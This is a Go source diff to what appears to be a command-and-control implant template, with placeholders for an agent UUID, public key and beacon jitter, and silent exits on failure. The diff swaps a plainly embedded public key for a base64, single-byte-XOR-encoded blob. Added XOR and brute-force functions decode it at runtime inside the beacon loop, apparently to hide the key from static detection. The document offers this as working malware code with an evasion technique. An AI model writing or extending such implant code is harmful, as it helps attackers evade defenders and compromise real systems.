@@ -23,6 +23,29 @@ import (
 	"golang.org/x/crypto/chacha20poly1305"
 )
 
+func xor(input, key []byte) []byte {
+	result := make([]byte, len(input))
+	keyLength := len(key)
+
+	for i := 0; i < len(input); i++ {
+		result[i] = input[i] ^ key[i%keyLength]
+	}
+	return result
+}
+
+func bruteforce(encrypted, knownPrefix []byte) []byte {
+	for k := 0; k < 256; k++ {
+		key := []byte{byte(k)}
+
+		decrypted := xor(encrypted[:10], key)
+
+		if string(decrypted[:10]) == string(knownPrefix) {
+			return xor(encrypted, key)
+		}
+	}
+	return nil
+}
+
 func DetermineGroups() ([]string, error) {
 	gid, _ := os.Getgroups()
 	var groups []string
@@ -106,20 +129,6 @@ func getCurrentUser() (name string) {
 var expectedFingerprint uint32
 
 func main() {
-
-	const pubKeyPEM = "-----BEGIN PUBLIC KEY-----\n{{.Pubkey}}\n-----END PUBLIC KEY-----"
-	PEMBlock, _ := pem.Decode([]byte(pubKeyPEM))
-	if PEMBlock == nil {
-		os.Exit(0)
-	}
-	if PEMBlock.Type != "PUBLIC KEY" {
-		os.Exit(0)
-	}
-	pubkey, err2 := x509.ParsePKIXPublicKey(PEMBlock.Bytes)
-	if err2 != nil {
-		os.Exit(0)
-	}
-
 	uuid := strings.ToUpper("{{.UUID}}")
 	// Construct the client for requests, we define nothing right now but in the future can add functionality
 	//client := &http.Client{}
@@ -154,6 +163,22 @@ func main() {
 	}
 
 	for true {
+		const pubKeyPEM = "{{.Pubkey}}"
+		known := "{{.Prefix}}"
+		decoded, _ := base64.StdEncoding.DecodeString(string(pubKeyPEM))
+		decrypted := bruteforce(decoded, []byte(known))
+		PEMBlock, _ := pem.Decode(decrypted)
+		if PEMBlock == nil {
+			os.Exit(0)
+		}
+		if PEMBlock.Type != "PUBLIC KEY" {
+			os.Exit(0)
+		}
+		pubkey, err2 := x509.ParsePKIXPublicKey(PEMBlock.Bytes)
+		if err2 != nil {
+			os.Exit(0)
+		}
+
 		ran := rand.New(rand.NewSource(time.Now().UnixNano()))
 		rng := rand.New(ran)
 		jitter := rng.Intn({{.Jitter}}) + 1
